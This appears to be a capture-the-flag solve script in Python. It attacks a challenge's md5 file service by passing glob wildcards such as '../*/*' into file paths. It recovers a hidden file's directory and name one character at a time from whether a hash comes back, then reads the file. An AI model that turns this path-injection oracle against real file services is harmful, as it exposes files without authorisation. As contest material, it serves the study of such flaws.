#!/usr/env python3

# cd solv
# python3 solve.py

import sys
sys.path.append('../')
from private.md5service import read_file, md5_file

import string 

alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.'

suffix = '.txt'
preffix = '../*/*'

def get_char(s):
    return preffix + s + suffix

def fetch_file():
    global suffix
    while True:
        notfound = True
        for c in alphabet:
            md5 = md5_file(get_char(c))
            if md5 != b'\n':
                suffix = c + suffix
                notfound = False
                print(suffix)
                break
        if notfound:
            break

fetch_file()
preffix = '../*'
suffix = '/'+suffix
fetch_file()
print(read_file('../'+suffix))